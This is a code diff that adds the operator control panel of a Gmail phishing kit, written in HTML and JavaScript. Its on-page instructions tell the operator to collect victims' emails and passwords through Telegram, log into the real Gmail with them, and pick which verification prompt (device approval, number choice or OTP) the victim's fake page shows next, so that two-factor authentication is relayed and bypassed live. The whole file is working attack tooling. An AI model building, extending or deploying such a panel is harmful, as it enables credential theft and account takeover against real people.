@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Verification Control Panel</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #1a73e8;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+        }
+        button:hover {
+            background: #1557b0;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .status.success {
+            background: #e8f5e8;
+            color: #2e7d32;
+            border: 1px solid #4caf50;
+        }
+        .status.error {
+            background: #ffeaea;
+            color: #c62828;
+            border: 1px solid #ef5350;
+        }
+        .instructions {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            border-left: 4px solid #1a73e8;
+        }
+        .current-verifications {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dadce0;
+        }
+        .verification-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+        .verification-item button {
+            background: #dc3545;
+            width: auto;
+            padding: 6px 12px;
+        }
+        .verification-item button:hover {
+            background: #c82333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Gmail Verification Control Panel</h1>
+
+        <div class="instructions">
+            <strong>How to use:</strong>
+            <ol>
+                <li>Wait for victim to enter email/password (you'll get it in Telegram)</li>
+                <li>Try logging into real Gmail with those credentials</li>
+                <li>If Gmail shows "Verify it's you" (Yes/No), select "device_verify"</li>
+                <li>If Gmail shows "Choose a verification code" (number grid), select "choose_number"</li>
+                <li>If Gmail shows "Enter the verification code" (6-digit OTP), select "otp"</li>
+                <li>Victim's page will automatically show the correct prompt</li>
+            </ol>
+        </div>
+
+        <form id="verificationForm">
+            <div class="form-group">
+                <label for="identifier">Victim's Email or Phone Number:</label>
+                <input type="text" id="identifier" required placeholder="Enter the email or phone number you received in Telegram">
+                <small style="color: #666; font-size: 12px;">Works with both email addresses (user@gmail.com) and phone numbers (+1234567890)</small>
+            </div>
+
+            <div class="form-group">
+                <label for="prompt_type">Verification Prompt Gmail is Showing:</label>
+                <select id="prompt_type" required>
+                    <option value="">Select prompt type...</option>
+                    <option value="device_verify">Device Verification (Tap Yes/No)</option>
+                    <option value="choose_number">Number Selection (Choose a number)</option>
+                    <option value="otp">OTP Verification (Enter 6-digit code)</option>
+                </select>
+            </div>
+
+            <div class="form-group" id="numbers-group" style="display: none;">
+                <label for="number">Number Gmail Wants User to Select:</label>
+                <input type="text" id="number" placeholder="e.g. 42" pattern="[0-9]{1,2}" maxlength="2" title="Enter the number (0-99) that Gmail is asking the user to select">
+                <small style="color: #666; font-size: 12px;">Enter the number Gmail highlights/asks the victim to tap (1-2 digits)</small>
+            </div>
+
+            <button type="submit">Set Verification Prompt</button>
+        </form>
+
+        <div id="status" class="status"></div>
+
+        <div class="current-verifications">
+            <h3>Current Active Verifications</h3>
+            <div id="verificationsList">
+                <!-- Will be populated by JavaScript -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Wait for DOM to be fully loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('verificationForm');
+            const statusDiv = document.getElementById('status');
+            const promptTypeSelect = document.getElementById('prompt_type');
+            const numbersGroup = document.getElementById('numbers-group');
+            const numbersInput = document.getElementById('number');
+
+            // Show/hide numbers input based on prompt type selection
+            promptTypeSelect.addEventListener('change', function() {
+                if (this.value === 'choose_number') {
+                    numbersGroup.style.display = 'block';
+                    if (numbersInput) numbersInput.required = true;
+                } else {
+                    numbersGroup.style.display = 'none';
+                    if (numbersInput) {
+                        numbersInput.required = false;
+                        numbersInput.value = '';
+                    }
+                }
+            });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const identifier = document.getElementById('identifier').value;
+            const promptType = document.getElementById('prompt_type').value;
+            const number = document.getElementById('number').value;
+
+            let formData = 'identifier=' + encodeURIComponent(identifier) + '&prompt_type=' + encodeURIComponent(promptType);
+
+            if (promptType === 'choose_number') {
+                formData += '&number=' + encodeURIComponent(number);
+            }
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/api/verify.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    try {
+                        const response = JSON.parse(xhr.responseText);
+                        statusDiv.style.display = 'block';
+                        if (response.success) {
+                            statusDiv.className = 'status success';
+                            statusDiv.textContent = response.message;
+                            form.reset();
+                            numbersGroup.style.display = 'none';
+                            loadVerifications();
+                        } else {
+                            statusDiv.className = 'status error';
+                            statusDiv.textContent = response.error || 'Error occurred';
+                        }
+                    } catch (e) {
+                        statusDiv.style.display = 'block';
+                        statusDiv.className = 'status error';
+                        statusDiv.textContent = 'Server response error';
+                    }
+                }
+            };
+            xhr.send(formData);
+        });
+
+        function loadVerifications() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', '/api/verify.php?list=all', true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        try {
+                            const data = JSON.parse(xhr.responseText);
+                            displayVerifications(data);
+                        } catch (e) {
+                            console.error('Failed to parse verifications data:', xhr.responseText);
+                            displayVerifications({});
+                        }
+                    } else {
+                        console.error('Failed to load verifications, status:', xhr.status);
+                        displayVerifications({});
+                    }
+                }
+            };
+            xhr.send();
+        }
+
+        function displayVerifications(data) {
+            const listDiv = document.getElementById('verificationsList');
+            listDiv.innerHTML = '';
+
+            if (Object.keys(data).length === 0) {
+                listDiv.innerHTML = '<p>No active verifications</p>';
+                return;
+            }
+
+            Object.values(data).forEach(item => {
+                const numberText = item.number !== undefined ? ` | Number: ${item.number}` : '';
+                const identifier = item.identifier || item.email;
+                const itemDiv = document.createElement('div');
+                itemDiv.className = 'verification-item';
+                itemDiv.innerHTML = `
+                    <div>
+                        <strong>${identifier}</strong><br>
+                        <small>Prompt: ${item.prompt_type}${numberText} | Set: ${new Date(item.timestamp * 1000).toLocaleString()}</small>
+                    </div>
+                    <button onclick="clearVerification('${identifier}')">Clear</button>
+                `;
+                listDiv.appendChild(itemDiv);
+            });
+        }
+
+        function clearVerification(email) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('DELETE', '/api/verify.php?email=' + encodeURIComponent(email), true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    try {
+                        const response = JSON.parse(xhr.responseText);
+                        if (response.success) {
+                            loadVerifications();
+                        }
+                    } catch (e) {
+                        console.error('Failed to parse clear response');
+                    }
+                }
+            };
+            xhr.send();
+        }
+
+        // Load verifications on page load
+        loadVerifications();
+        });
+    </script>
+</body>
+</html>
